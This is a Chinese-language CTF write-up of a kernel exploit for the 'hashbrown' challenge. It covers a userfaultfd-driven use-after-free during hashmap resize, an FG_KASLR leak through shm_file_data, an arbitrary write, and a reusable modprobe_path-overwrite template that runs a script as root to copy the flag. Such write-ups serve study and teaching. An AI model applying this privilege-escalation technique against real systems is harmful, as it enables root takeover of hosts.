# hashbrown
## IDA

题目是一个哈希表，代码完成了增删查改以及扩容的功能。

```c
struct hash_entry
{
  uint32_t key;
  uint32_t size;
  char *value;
  hash_entry *next;
};
struct hashmap_t
{
  uint32_t size;
  uint32_t threshold;
  uint32_t entry_count;
  hash_entry_0 **buckets;
};
struct request_t
{
  uint32_t key;
  uint32_t size;
  char *src;
  char *dest;
};
//0x1337: add
if entry_count == threshold:
	threashold = size*1.5
	newsize = 2*size
	newhash = kzalloc(newsize*8)
	newhash <= hashmap

	add_entry(key)
	copy_from_user(entry->val, src)
add_entry(key)
//0x1338: delete key
delete_key(idx, key)
//0x1339: update
update_value(idx, key, size, src)
//0x133a: delete value
delete_val(idx, key)
//0x133b: show value
show_val(idx, key, size, dst)
```

问题在于resize与增删查改的`mutex`不同，而且`resize`在新旧hash表拷贝的过程中存在一个`copy_from_user`，因此可以被userfaultfd来劫持，在此期间通过对原hash表进行删除，则会造成UAF。

## FG_KASLR

会以更细的粒度修改函数的偏移（相对位置），只会修改部分函数，数据段不会修改。

[https://blog.csdn.net/abel_big_xu/article/details/115273078](https://blog.csdn.net/abel_big_xu/article/details/115273078) 发现大概一半的函数会被影响。

本题通过shmem来实现信息泄漏：

```c
if((shmid = shmget(IPC_PRIVATE, 0x1000, 0600)) < 0)
  _perror("shmget");
delev(uaf1);
/* Fill value with shm */
if((shmaddr = shmat(shmid, NULL, 0)) < 0)
  _perror("shmat");

struct shm_file_data {
	int id ;
	struct ipc_namespace * ns ;
	struct file * file ;
	const struct vm _operations_struct * vm _ ops ;  //shmem_vm_ops
};
```

## 信息泄漏

1. 计算到达`resize`的临界值，第一次是0xc
2. 下一次add的`request→src`注册`userfaultfd`，handler中调用`delev(uaf1)`
3. `shamat`申请0x20的`shm_file_data`
4. `show(uaf1)`来信息泄漏

```c
for(i=0;i < threshold;i++)
    add(i, 0x20, val);
// resize and userfaultfd
void* handle_page = get_userfault_page(2);

RUN_JOB(add, key1, 0x20, handle_page);

if((shmid = shmget(IPC_PRIVATE, 0x1000, 0600)) < 0)
  _perror("shmget");
delev(uaf1);
/* Fill value with shm */
if((shmaddr = shmat(shmid, NULL, 0)) < 0)
  _perror("shmat");

release_fault_page();
show(uaf1, 0x20, rbuf);
xxd(rbuf, 2);
size_t * ptr = (size_t *)rbuf;
kernbase = ptr[3] - 0x822b80;
size_t modprobe_path = kernbase + 0xa46fe0;
printf("[+] kernbase: %p\n", kernbase);
printf("[+] modprobe_path: %p\n", modprobe_path);
```

## 修改modprob_path

1. 到达第二次临界值
2. 下一次add的`request→src`注册`userfaultfd`，handler中调用`delev(uaf2)`
3. 不断申请新的hash_entry，试图拿到释放的uaf2的value，设此时的新entry为key3
4. 通过edit(uaf2)来修改key3的value地址，通过edit(key3)来修改value的值，因此实现了任意地址写，进而可以修改modprobe_path的值

```c
for(i=0xd;i<threshold;i++)
    add(i,0x18,val);
RUN_JOB(add, key2, 0x18, handle_page+PAGE_SIZE);
delev(uaf2);
release_fault_page();
for(i=threshold+1;;i++)
{
    add(i,0x18,val);
    show(uaf2,0x18,rbuf); [1]
    if(((uint32_t*)rbuf)[0] != 0x41414141) {
        key3 = ((uint*)rbuf)[0];
        xxd(rbuf, 2);
        printf("[!] find it, key3=%d", key3);
        break;
    }
}
struct hash_entry victim = {
    .key = ((uint*)rbuf)[0],
    .size = ((uint*)rbuf)[1],
    .value = modprobe_path,
    .next = NULL
};
// hash[key3] == hash[uaf2].value
edit(uaf2, 0x18, &victim);
edit(key3, 0x18, "/home/ctf/1.sh");
```

由于此题用的是SLAB，因此最小的object大小为0x20，这也是nirugiri采用0x20没问题的原因。

[1]处存在一定的风险，即heap spray时，可能会造成uaf2的value被spray的value而不是hash_entry占据；但是修改0x18后，无法达到效果，可能是get_hash_idx(key,size)与size相关，因此改变size会进入不同的bucket。

## 触发modprobe_path

借此题形成一个简洁的模版：

```c
edit(key3, 0x18, "/home/ctf/1.sh");
system("echo -ne '#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt' > /home/ctf/1.sh");
system("chmod +x /home/ctf/1.sh");
system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/bad");
system("chmod +x /home/ctf/bad");
system("/home/ctf/bad");

//trigger
system("cat /home/ctf/flag.txt");
```

## 通过uaf构造任意写
